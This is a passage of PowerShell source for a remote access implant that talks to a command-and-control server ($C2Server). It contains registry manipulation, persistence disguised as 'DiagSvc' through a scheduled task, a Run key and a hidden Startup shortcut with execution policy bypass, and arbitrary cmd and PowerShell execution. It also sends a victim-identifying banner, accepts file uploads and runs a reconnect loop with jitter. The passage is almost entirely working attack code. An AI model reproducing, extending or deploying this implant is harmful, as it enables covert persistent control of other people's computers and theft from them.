                            $lines = $r.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object { "$($_.Name) = $($_.Value)" }
                            return @{ type = "OUTPUT"; data = ($lines -join "`n") }
                        }
                    }
                    "write" {
                        if ($argList.Length -lt 4) { return @{ type = "ERROR"; data = "Usage: reg write <path> <name> <value>" } }
                        $name = Get-ArgAt $argList 2
                        $data = Get-ArgAt $argList 3
                        if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
                        Set-ItemProperty -Path $path -Name $name -Value $data -ErrorAction Stop
                        return @{ type = "OUTPUT"; data = "[+] Registry written" }
                    }
                    "delete" {
                        # backup via reg.exe export before deleting
                        $regPath = $path
                        if     ($regPath -match '^HKCU:\\') { $regPath = $regPath -replace '^HKCU:\\', 'HKEY_CURRENT_USER\' }
                        elseif ($regPath -match '^HKLM:\\') { $regPath = $regPath -replace '^HKLM:\\', 'HKEY_LOCAL_MACHINE\' }
                        elseif ($regPath -match '^HKCR:\\') { $regPath = $regPath -replace '^HKCR:\\', 'HKEY_CLASSES_ROOT\' }
                        elseif ($regPath -match '^HKU:\\')  { $regPath = $regPath -replace '^HKU:\\',  'HKEY_USERS\' }
                        elseif ($regPath -match '^HKCC:\\') { $regPath = $regPath -replace '^HKCC:\\', 'HKEY_CURRENT_CONFIG\' }
                        $backup = Join-Path $env:TEMP ("reg_backup_" + [Guid]::NewGuid().ToString("N").Substring(0,8) + ".reg")
                        $export = & reg.exe export $regPath $backup /y 2>&1
                        if ($LASTEXITCODE -ne 0) {
                            return @{ type = "ERROR"; data = "reg delete: export failed (no backup made): $export" }
                        }
                        try {
                            Remove-Item -Path $path -Recurse -Force -ErrorAction Stop
                            return @{ type = "OUTPUT"; data = "[+] Registry deleted. Backup: $backup" }
                        } catch {
                            return @{ type = "ERROR"; data = "reg delete: $_ (backup preserved: $backup)" }
                        }
                    }
                    default { return @{ type = "ERROR"; data = "reg: unknown action '$action'" } }
                }
            } catch { return @{ type = "ERROR"; data = "reg: $_" } }
        }

        # ==================== PERSISTENCE ====================
        "persist" {
            if ($argList.Length -eq 0) {
                return @{ type = "ERROR"; data = "Usage: persist <schtask|runkey|startup>" }
            }
            $method = (Get-ArgAt $argList 0).ToLower()
            $selfPath = $Global:__SelfPath
            if (-not $selfPath) { $selfPath = Resolve-SelfPath }
            if (-not $selfPath) {
                return @{ type = "ERROR"; data = "persist: cannot determine agent path (likely -Enc invocation)" }
            }
            $cmd = "powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File `"$selfPath`""
            try {
                switch ($method) {
                    "schtask" {
                        $taskName = "DiagSvc_$($script:_s.SessionID)"
                        $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -ExecutionPolicy Bypass -File `"$selfPath`""
                        $trigger = New-ScheduledTaskTrigger -AtLogOn
                        Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $trigger -RunLevel Highest -Force -ErrorAction Stop | Out-Null
                        return @{ type = "OUTPUT"; data = "[+] Persistence: scheduled task '$taskName'" }
                    }
                    "runkey" {
                        $key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                        if (-not (Test-Path $key)) { New-Item -Path $key -Force | Out-Null }
                        Set-ItemProperty -Path $key -Name "DiagSvc" -Value $cmd -Force -ErrorAction Stop
                        return @{ type = "OUTPUT"; data = "[+] Persistence: registry Run key" }
                    }
                    "startup" {
                        $startupDir = [Environment]::GetFolderPath('Startup')
                        $lnk = Join-Path $startupDir "DiagSvc.lnk"
                        $ws = New-Object -ComObject WScript.Shell
                        $sc = $ws.CreateShortcut($lnk)
                        $sc.TargetPath = "powershell.exe"
                        $sc.Arguments = "-NoP -NonI -W Hidden -ExecutionPolicy Bypass -File `"$selfPath`""
                        $sc.WindowStyle = 7
                        $sc.Save()
                        return @{ type = "OUTPUT"; data = "[+] Persistence: Startup shortcut '$lnk'" }
                    }
                    default { return @{ type = "ERROR"; data = "persist: unknown method '$method'" } }
                }
            } catch { return @{ type = "ERROR"; data = "persist: $_" } }
        }

        "unpersist" {
            try {
                $removed = @()
                Get-ScheduledTask -TaskName "DiagSvc_*" -ErrorAction SilentlyContinue | ForEach-Object {
                    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                    $removed += "task:$($_.TaskName)"
                }
                try {
                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "DiagSvc" -Force -ErrorAction Stop
                    $removed += "runkey"
                } catch {}
                $lnk = Join-Path ([Environment]::GetFolderPath('Startup')) "DiagSvc.lnk"
                if (Test-Path $lnk) { Remove-Item $lnk -Force; $removed += "startup" }
                if ($removed.Count -eq 0) { return @{ type = "OUTPUT"; data = "No persistence found" } }
                return @{ type = "OUTPUT"; data = "[+] Removed persistence: $($removed -join ', ')" }
            } catch { return @{ type = "ERROR"; data = "unpersist: $_" } }
        }

        # ==================== SHELL ====================
        "shell" {
            if ($argList.Length -eq 0) { return @{ type = "ERROR"; data = "Usage: shell <command>" } }
            try {
                $cmdline = Join-Args $argList 0
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName  = "cmd.exe"
                $psi.Arguments = "/c chcp 65001>nul & $cmdline"
                $psi.WorkingDirectory = $script:_s.CurrentDir
                $psi.RedirectStandardOutput = $true
                $psi.RedirectStandardError  = $true
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow  = $true
                $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
                $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8

                $proc = [System.Diagnostics.Process]::Start($psi)
                $outTask = $proc.StandardOutput.ReadToEndAsync()
                $errTask = $proc.StandardError.ReadToEndAsync()
                if (-not $proc.WaitForExit(30000)) {
                    try { $proc.Kill() } catch {}
                    $stdout = $outTask.Result
                    $stderr = $errTask.Result + "`n[timeout: killed after 30s]"
                } else {
                    $stdout = $outTask.Result
                    $stderr = $errTask.Result
                }
                $out = $stdout
                if ($stderr) { $out += "`n[stderr]`n$stderr" }
                return @{ type = "OUTPUT"; data = $out }
            } catch { return @{ type = "ERROR"; data = "shell: $_" } }
        }

        "powershell" {
            if ($argList.Length -eq 0) { return @{ type = "ERROR"; data = "Usage: powershell <command>" } }
            try {
                $cmdline = Join-Args $argList 0
                $out = Invoke-WithTimeout -Command $cmdline -TimeoutSec 30
                return @{ type = "OUTPUT"; data = $out }
            } catch { return @{ type = "ERROR"; data = "powershell: $_" } }
        }

        # ==================== HELP ====================
        "help" {
            $h = @"
AGENT COMMANDS v5.5
---------------------------------------------------------------
NAVIGATION  cd <path> | pwd | whoami | hostname
FILESYSTEM  ls [path] | tree [path] | find <pat> [path]
            cat <file> | head <file> [n] | tail <file> [n]
            grep <pat> <file> | hash <file> [MD5|SHA1|SHA256]
            mkdir <dir> | rm <path> | cp <src> <dst>
            mv <src> <dst> | compress <src> <zip> | uncompress <zip> <dir>
SYSTEM      sysinfo | env | drives | services [filter] | tasks
            netstat | ifconfig | ps [filter] | kill <pid>
TRANSFER    download <path> | upload <remote> <local>
            wget <url> <out>
SCREEN      screenshot (chunked automatically)
REGISTRY    reg read|write|delete <path> [name] [value]
            (delete auto-backs-up to %TEMP%\reg_backup_*.reg)
PERSIST     persist <schtask|runkey|startup> | unpersist
EXECUTION   shell <cmd> | powershell <cmd>  (30s hard timeout)
DANGER      selfdestruct CONFIRM
EXIT        exit | kill
---------------------------------------------------------------
"@
            return @{ type = "OUTPUT"; data = $h }
        }

        default {
            try {
                $out = Invoke-WithTimeout -Command $RawCommand -TimeoutSec 30
                return @{ type = "OUTPUT"; data = $out }
            } catch { return @{ type = "ERROR"; data = "$_" } }
        }
    }
}

# ==================== SESSION ====================
function Start-AgentSession {
    param([string]$Server, [int]$Port)
    $conn = $null
    $script:_s.ActiveConn = $null

    try {
        $script:_s.State = "CONNECTING"
        $conn = New-Transport -Server $Server -Port $Port
        $script:_s.ActiveConn = $conn
        $script:_s.State = "CONNECTED"
        $script:_s.LastPing = [DateTime]::Now

        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        $banner = @{
            hostname = $env:COMPUTERNAME
            username = "$env:USERDOMAIN\$env:USERNAME"
            os       = if ($os) { "$($os.Caption) $($os.OSArchitecture)" } else { "unknown" }
            version  = if ($os) { $os.Version } else { "unknown" }
            arch     = $env:PROCESSOR_ARCHITECTURE
            pid      = $PID
            pwd      = $script:_s.CurrentDir
            psver    = "$($PSVersionTable.PSVersion)"
            agentver = "5.5"
            selfpath = "$($Global:__SelfPath)"
        } | ConvertTo-Json -Compress
        Send-Frame -Conn $conn -Type "SESSION" -Data $banner | Out-Null

        while ($script:_s.State -eq "CONNECTED" -and -not $script:_s.Shutdown) {
            if ([DateTime]::Now.Subtract($script:_s.LastPing).TotalSeconds -ge $HeartbeatInt) {
                if (-not (Send-Frame -Conn $conn -Type "PING" -Data "alive")) {
                    $script:_s.State = "RECONNECTING"; break
                }
                $script:_s.LastPing = [DateTime]::Now
            }

            $packets = Read-Frame -Conn $conn -TimeoutMs 1000
            if ($null -eq $packets) {
                if (-not (Test-SocketHealth -TcpClient $conn.Tcp)) {
                    $script:_s.State = "RECONNECTING"; break
                }
                continue
            }

            $breakOuter = $false
            foreach ($pkt in $packets) {
                switch ($pkt.type) {
                    "PONG" { continue }
                    "CMD" {
                        $result = Invoke-RemoteAction -RawCommand $pkt.data
                        if ($result.type -in @("EXIT","KILL","DESTRUCT")) {
                            Send-Frame -Conn $conn -Type $result.type -Data $result.data | Out-Null
                            $script:_s.Shutdown = $true
                            return
                        }
                        if (-not (Send-Frame -Conn $conn -Type $result.type -Data $result.data)) {
                            $script:_s.State = "RECONNECTING"; $breakOuter = $true; break
                        }
                    }
                    "UPLOAD_START" {
                        $meta = $pkt.data -split '\|'
                        if ($meta.Count -ge 3) {
                            $script:_s.RxPath     = $meta[0]
                            $script:_s.RxSize     = [long]$meta[1]
                            $script:_s.RxExpected = [int]$meta[2]
                            $script:_s.RxReceived = 0
                            $script:_s.RxActive   = $true
                            $script:_s.RxChunks.Clear()
                        } else {
                            Send-Frame -Conn $conn -Type "ERROR" -Data "upload: bad header" | Out-Null
                        }
                    }
                    "FILE_CHUNK" {
                        if (-not $script:_s.RxActive) { continue }
                        $idx = $pkt.data.IndexOf('|')
                        if ($idx -gt 0) {
                            [void]$script:_s.RxChunks.Add($pkt.data.Substring($idx + 1))
                            $script:_s.RxReceived++
                        }
                    }
                    "UPLOAD_DONE" {
                        if (-not $script:_s.RxActive -or [string]::IsNullOrEmpty($script:_s.RxPath)) {
                            Send-Frame -Conn $conn -Type "ERROR" -Data "upload: no active transfer" | Out-Null
                            continue
                        }
                        if ($script:_s.RxReceived -ne $script:_s.RxExpected) {
                            Send-Frame -Conn $conn -Type "ERROR" -Data "upload: incomplete ($($script:_s.RxReceived)/$($script:_s.RxExpected))" | Out-Null
                            $script:_s.RxPath = $null; $script:_s.RxExpected = 0
                            $script:_s.RxReceived = 0; $script:_s.RxSize = 0
                            $script:_s.RxActive = $false; $script:_s.RxChunks.Clear()
                            continue
                        }
                        try {
                            $b64 = $script:_s.RxChunks -join ''
                            $bytes = if ($b64) { [Convert]::FromBase64String($b64) } else { [byte[]]@() }
                            $dir = Split-Path -Parent $script:_s.RxPath
                            if ($dir -and -not (Test-Path -LiteralPath $dir)) {
                                New-Item -ItemType Directory -Path $dir -Force | Out-Null
                            }
                            [IO.File]::WriteAllBytes($script:_s.RxPath, $bytes)
                            Send-Frame -Conn $conn -Type "OUTPUT" -Data "[+] Uploaded: $($script:_s.RxPath) ($($bytes.Length) bytes)" | Out-Null
                        } catch {
                            Send-Frame -Conn $conn -Type "ERROR" -Data "upload failed: $_" | Out-Null
                        } finally {
                            $script:_s.RxPath = $null; $script:_s.RxExpected = 0
                            $script:_s.RxReceived = 0; $script:_s.RxSize = 0
                            $script:_s.RxActive = $false; $script:_s.RxChunks.Clear()
                        }
                    }
                }
                if ($breakOuter) { break }
            }
        }
    } catch {
        $script:_s.State = "RECONNECTING"
    } finally {
        if ($conn) {
            try { $conn.Stream.Close() } catch {}
            try { $conn.Tcp.Close() }    catch {}
        }
        $script:_s.ActiveConn = $null
        $script:_s.RxActive   = $false
        $script:_s.RxChunks.Clear()
    }
}

# ==================== RESURRECTION ENGINE ====================
$retryCount = 0
while (-not $script:_s.Shutdown -and -not $script:_s.Destruct) {
    Start-AgentSession -Server $C2Server -Port $C2Port
    if ($script:_s.Shutdown -or $script:_s.Destruct) { break }

    $delay  = [Math]::Min([Math]::Pow($RetryBase, [Math]::Min($retryCount, 6)), $RetryMax)
    $actual = Get-JitterDelay -Base ([int]$delay) -Max $RetryMax
    $retryCount++

    $elapsed = 0
    while ($elapsed -lt $actual -and -not $script:_s.Shutdown -and -not $script:_s.Destruct) {
        Start-Sleep -Seconds 1
        $elapsed++
    }
}
